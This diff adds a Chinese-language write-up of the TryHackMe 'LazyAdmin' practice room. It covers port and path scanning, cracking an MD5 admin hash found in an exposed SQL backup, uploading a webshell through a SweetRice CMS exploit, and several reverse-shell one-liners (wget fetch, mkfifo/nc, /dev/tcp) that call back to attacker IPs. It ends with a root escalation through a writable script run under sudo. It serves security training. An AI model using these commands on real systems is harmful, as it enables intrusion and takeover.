@@ -1,0 +1,95 @@
+# LazyAdminFinal Writeup
+> URL : https://tryhackme.com/room/lazyadmin
+
+IP : 10.10.40.99
+
+## Scan
+- 根據套路，先掃 Port
+    - `nmap -A 10.10.40.99`
+    - ![](https://i.imgur.com/0Xc7KJW.png)
+    - 發現有開 80 跟 22
+- 觀察網頁
+    - 80 port 是一個 Apaphe 在 Ubuntu 上的 Default page
+    - ![](https://i.imgur.com/kSfBbQw.png)
+- 掃路徑
+    - `python3 dirsearch.py -u http://10.10.40.99`
+    - 掃到一個 `/content`
+    - http://10.10.40.99/content/
+        - 上面寫說他是 `SweetRice CMS`
+        - ![](https://i.imgur.com/Fx2sPrS.png)
+- 根據 `/content` 繼續掃會找到
+    - 裡面有一個 Change Log
+    - http://10.10.40.99/content/changelog.txt
+    - 裡面有寫到他的版本是 `1.5`
+- 尋找 Exploit
+    - 找到了適用的 Exploit，不過需要使用者帳號跟密碼
+    - https://www.exploit-db.com/exploits/40716
+- 繼續掃路徑
+    - 找到一個 `mysql_backup`
+        - http://10.10.40.99/content/inc/mysql_backup/
+        - 裡面有一個備份的 SQL 檔案
+        - 內部有一些看起來是 PHP 序列話的東西
+            - `5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";`
+                - ![](https://i.imgur.com/EAMeYsa.png)
+                - 看的出來 
+                    - `admin` : `manager`
+                    - `passwd` : `42f749ade7f9e195bf475f37a44cafcb`
+- 透過 Google 尋找
+    - Sweet Rice CMS 的後台是 `/as`
+    - http://10.10.40.99/content/as/
+- 嘗試登入
+    - 帳號 : `manager`
+    - 密碼 : `42f749ade7f9e195bf475f37a44cafcb`
+        - 登入失敗
+        - 正常人也不太可能用這種東西作為密碼
+        - 拿去 Google 後發現是 MD5
+            - 可以透過這個網站解碼 https://md5.gromweb.com/?md5=42f749ade7f9e195bf475f37a44cafcb
+            - ![](https://i.imgur.com/dD3gjq5.png)
+            - 所以答案是 `Password123`
+        - 登入成功
+    - ![](https://i.imgur.com/0KYq7Vr.png)
+##  Exploit
+- 下載檔案
+    - `wget https://www.exploit-db.com/download/40716 -O 40716.py`
+- `python3 40716.py` 執行並輸入需要的資料
+    - `10.10.40.99/content`
+    - `manager`
+    - `Password123`
+    - `webshell.php5`
+        - 這邊我嘗試了 `webshell.php` 但是失敗
+        - 根據Exploit提示的改用 `webshell.php5` 就可以ㄌ
+        - ![](https://i.imgur.com/rXuDNVF.png)
+- 使用 Webshell
+    - 可以成功連上
+        - ![](https://i.imgur.com/jlR37Zn.png)
+    - 改接 Reverse shell
+        - `http://10.10.40.99/content/attachment/webshell.php5?A=wget%2010.13.21.55:8000/s%20-O%20/tmp/s`
+        - 本地端執行 `nc -nlvp 7877`
+        - 網址shell `bash /tmp/s`
+        - 就順利接上ㄌ
+            - ![](https://i.imgur.com/AtRVVea.png)
+- 取得 Flag
+    - ![](https://i.imgur.com/19Vfvm4.png)
+## 準備提權
+- 家目錄看到一組帳號密碼，先存下來
+    - ![](https://i.imgur.com/cxcqYN8.png)
+    - `rice:randompass`
+- 透過 `sudo -l` 發現我們可以用 sudo 執行這一段 Perl
+    - ![](https://i.imgur.com/SBhtfeX.png)
+    - 而這一段 perl 會用 sh 呼叫 `/etc/copy.sh`
+- 觀察 `ls -al /etc/copy.sh`
+    - 可以發現我們有 Write 的權限
+    - ![](https://i.imgur.com/c957GVn.png)
+- 先把 `/etc/copy.sh` 備份一下以免搞壞
+    - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f`
+    - ![](https://i.imgur.com/1wXCkEG.png)
+- 寫入我們的 Reverse shell
+    - `echo "bash -c 'bash -i >& /dev/tcp/10.13.21.55/7878 0>&1'" > /etc/copy.sh`
+- 監聽 Reverse shell
+    - `nc -nvlp 7878`
+- 執行 Reverse shell
+    - `sudo /usr/bin/perl /home/itguy/backup.pl`
+- 取得 Root
+    - ![](https://i.imgur.com/Ud0s3aW.png)
+- 取得 Root Flag
+    - ![](https://i.imgur.com/bSd6ogT.png)
